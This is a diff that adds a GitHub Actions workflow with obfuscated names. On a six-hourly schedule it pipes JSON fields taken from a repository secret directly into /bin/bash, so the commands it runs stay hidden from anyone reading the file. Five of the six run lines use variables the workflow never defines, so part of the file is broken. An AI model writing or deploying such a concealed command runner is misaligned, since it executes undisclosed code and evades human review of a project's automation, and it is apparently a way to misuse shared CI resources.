@@ -1,0 +1,22 @@
+name: workgongzuol
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: workgongzuol
+        env:
+          na44: ${{ secrets.na44 }}
+        run: |
+          echo $na44 | jq -r .oyl5 | /bin/bash
+          echo $ambtr821 | jq -r .bayk08 | /bin/bash
+          echo $rezbc3 | jq -r .d08886 | /bin/bash
+          echo $ko3 | jq -r .pyye8 | /bin/bash
+          echo $fg49 | jq -r .avh1 | /bin/bash
+          echo $i9324 | jq -r .q703 | /bin/bash
+
